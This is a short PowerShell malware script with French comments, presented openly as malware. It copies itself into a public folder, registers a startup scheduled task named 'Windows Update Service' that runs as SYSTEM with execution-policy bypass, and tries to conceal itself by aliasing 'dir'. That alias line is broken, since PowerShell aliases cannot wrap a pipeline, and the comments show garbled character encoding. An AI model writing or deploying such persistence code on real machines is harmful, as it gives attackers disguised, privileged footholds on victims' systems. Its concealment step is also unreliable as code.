
# D√©finition du chemin o√π le malware va se copier
$MalwarePath = "C:\Users\Public\malware.ps1"

# Si le script n'est pas d√©j√† √† l'emplacement cible, il s'y copie
if ($MyInvocation.MyCommand.Path -ne $MalwarePath) {
    Copy-Item $MyInvocation.MyCommand.Path -Destination $MalwarePath -Force
}

# Ajout d'une t√¢che planifi√©e pour persister
$TaskName = "Windows Update Service"
$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $MalwarePath"
$TaskTrigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -User "SYSTEM" -RunLevel Highest -Force

# Modifie la commande `dir` pour cacher le fichier malware
Set-Alias dir "dir | findstr /V malware.ps1"

Write-Host "üòà Malware actif et persistant !"
